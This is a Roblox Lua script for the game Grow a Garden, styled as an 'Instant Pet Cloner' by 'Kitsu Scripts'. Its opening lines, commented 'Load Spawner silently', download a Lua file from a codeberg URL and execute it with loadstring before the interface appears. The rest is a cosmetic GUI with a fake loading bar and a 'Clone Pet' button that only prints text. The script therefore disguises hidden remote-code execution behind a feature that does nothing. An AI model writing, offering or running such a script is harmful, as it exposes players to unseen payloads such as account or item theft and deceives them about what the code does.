-- Load Spawner silently
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
Spawner.Load = function() end
pcall(function() Spawner.Load() end)

-- Services
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

-- Cleanup
local GUI_NAME = "Kitsu"
if PlayerGui:FindFirstChild(GUI_NAME) then
	PlayerGui[GUI_NAME]:Destroy()
end

-- GUI Setup
local screenGui = Instance.new("ScreenGui", PlayerGui)
screenGui.Name = GUI_NAME
screenGui.ResetOnSpawn = false

-- Main Frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 400, 0, 300)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 25, 45)
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)
Instance.new("UIStroke", mainFrame).Color = Color3.fromRGB(80, 255, 170)

-- Title
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -20, 0, 30)
title.Position = UDim2.new(0.5, 0, 0, 12)
title.AnchorPoint = Vector2.new(0.5, 0)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 26
title.TextColor3 = Color3.fromRGB(180, 255, 180)
title.Text = "Instant Pet Cloner"

-- Subtitle
local subtitle = Instance.new("TextLabel", mainFrame)
subtitle.Size = UDim2.new(1, -20, 0, 20)
subtitle.Position = UDim2.new(0.5, 0, 0, 42)
subtitle.AnchorPoint = Vector2.new(0.5, 0)
subtitle.BackgroundTransparency = 1
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 14
subtitle.TextColor3 = Color3.fromRGB(130, 230, 130)
subtitle.Text = "Aesthetic Edition by Kitsu Scripts"

-- Loading Bar
local loadingBarBackground = Instance.new("Frame", mainFrame)
loadingBarBackground.Size = UDim2.new(0.8, 0, 0, 18)
loadingBarBackground.Position = UDim2.new(0.5, 0, 0.6, 0)
loadingBarBackground.AnchorPoint = Vector2.new(0.5, 0)
loadingBarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
Instance.new("UICorner", loadingBarBackground).CornerRadius = UDim.new(0, 8)

local loadingBar = Instance.new("Frame", loadingBarBackground)
loadingBar.Size = UDim2.new(0, 0, 1, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(90, 255, 160)
Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 8)

-- Loading Percent Text
local percentText = Instance.new("TextLabel", mainFrame)
percentText.Size = UDim2.new(1, 0, 0, 24)
percentText.Position = UDim2.new(0.5, 0, 0.6, -28)
percentText.AnchorPoint = Vector2.new(0.5, 0)
percentText.BackgroundTransparency = 1
percentText.Font = Enum.Font.GothamBold
percentText.TextSize = 18
percentText.TextColor3 = Color3.fromRGB(200, 255, 200)
percentText.Text = "Loading: 0%"

-- Footer Text
local footer = Instance.new("TextLabel", mainFrame)
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0.5, 0, 1, -24)
footer.AnchorPoint = Vector2.new(0.5, 1)
footer.BackgroundTransparency = 1
footer.Font = Enum.Font.Gotham
footer.TextSize = 14
footer.TextColor3 = Color3.fromRGB(100, 255, 100)
footer.Text = "Kitsu Scripts"

-- Animate Loading
local function animateLoading(callback)
	for i = 1, 100 do
		percentText.Text = "Loading: " .. i .. "%"
		loadingBar.Size = UDim2.new(i / 100, 0, 1, 0)
		wait(0.02)
	end
	callback()
end

-- Full GUI Content
local function createFullUI()
	loadingBarBackground:Destroy()
	percentText:Destroy()
	title.Text = "Pet Cloner"
	subtitle.Text = "Select a pet and customize"

	local dropdown = Instance.new("TextButton", mainFrame)
	dropdown.Size = UDim2.new(0.8, 0, 0, 32)
	dropdown.Position = UDim2.new(0.5, 0, 0.35, 0)
	dropdown.AnchorPoint = Vector2.new(0.5, 0)
	dropdown.Text = "Choose Pet"
	dropdown.BackgroundColor3 = Color3.fromRGB(50, 40, 70)
	dropdown.TextColor3 = Color3.fromRGB(230, 255, 230)
	dropdown.Font = Enum.Font.Gotham
	dropdown.TextSize = 16
	Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 8)

	local weightInput = Instance.new("TextBox", mainFrame)
	weightInput.Size = UDim2.new(0.35, 0, 0, 30)
	weightInput.Position = UDim2.new(0.1, 0, 0.5, 0)
	weightInput.PlaceholderText = "Weight"
	weightInput.Text = ""
	weightInput.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
	weightInput.TextColor3 = Color3.fromRGB(255, 255, 255)
	weightInput.Font = Enum.Font.Gotham
	weightInput.TextSize = 14
	Instance.new("UICorner", weightInput).CornerRadius = UDim.new(0, 6)

	local ageInput = Instance.new("TextBox", mainFrame)
	ageInput.Size = UDim2.new(0.35, 0, 0, 30)
	ageInput.Position = UDim2.new(0.55, 0, 0.5, 0)
	ageInput.PlaceholderText = "Age"
	ageInput.Text = ""
	ageInput.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
	ageInput.TextColor3 = Color3.fromRGB(255, 255, 255)
	ageInput.Font = Enum.Font.Gotham
	ageInput.TextSize = 14
	Instance.new("UICorner", ageInput).CornerRadius = UDim.new(0, 6)

	local cloneBtn = Instance.new("TextButton", mainFrame)
	cloneBtn.Size = UDim2.new(0.5, 0, 0, 34)
	cloneBtn.Position = UDim2.new(0.5, 0, 0.7, 0)
	cloneBtn.AnchorPoint = Vector2.new(0.5, 0)
	cloneBtn.Text = "Clone Pet"
	cloneBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 110)
	cloneBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	cloneBtn.Font = Enum.Font.GothamBold
	cloneBtn.TextSize = 16
	Instance.new("UICorner", cloneBtn).CornerRadius = UDim.new(0, 10)

	cloneBtn.MouseButton1Click:Connect(function()
		print("Cloning pet:", dropdown.Text, weightInput.Text, ageInput.Text)
	end)
end

animateLoading(createFullUI)
